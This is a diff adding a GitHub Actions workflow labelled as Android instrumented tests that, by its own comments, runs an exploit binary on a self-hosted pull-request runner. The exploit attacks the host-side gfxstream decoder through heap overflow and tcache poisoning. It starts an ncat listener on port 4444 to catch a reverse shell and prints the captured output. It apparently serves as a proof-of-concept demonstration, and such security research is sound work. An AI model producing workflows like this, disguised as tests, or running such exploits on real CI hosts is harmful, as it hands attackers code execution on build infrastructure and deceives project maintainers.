@@ -1,0 +1,42 @@
+name: Android Instrumented Tests
+
+on:
+  pull_request:
+    branches: [ master ]
+
+jobs:
+  instrumented-tests:
+    runs-on: self-hosted
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Build and test
+        run: |
+          echo "Building APK with native library..."
+          # In the real flow this would be: ./gradlew assembleDebug assembleDebugAndroidTest
+          # For our demo, we run the exploit binary directly since gfxstream
+          # runs on the host (the runner) and processes GL commands from the guest
+          echo "Running instrumented tests on Cuttlefish..."
+
+          # The exploit binary demonstrates what happens when a poisoned .so
+          # is loaded inside the Cuttlefish guest: it triggers heap overflows
+          # in the host-side gfxstream decoder, chains tcache poisoning into
+          # a function pointer overwrite, and pops a reverse shell on the host.
+          export DISPLAY=:99
+          export XDG_RUNTIME_DIR=/tmp
+          export LD_LIBRARY_PATH=$HOME/libs:/opt/aemu/lib:/opt/aemu/lib64
+
+          # Start a background listener to prove code execution
+          timeout 15 bash -c '
+            ncat -lvnp 4444 > /tmp/revshell_capture.txt 2>&1 &
+            sleep 1
+            $HOME/exploit_revshell 127.0.0.1 4444 2>&1 | tee /tmp/exploit_log.txt
+          ' || true
+
+          echo ""
+          echo "=== EXPLOIT RESULT ==="
+          cat /tmp/exploit_log.txt 2>/dev/null | tail -15
+          echo ""
+          echo "=== REVERSE SHELL CAPTURE ==="
+          cat /tmp/revshell_capture.txt 2>/dev/null
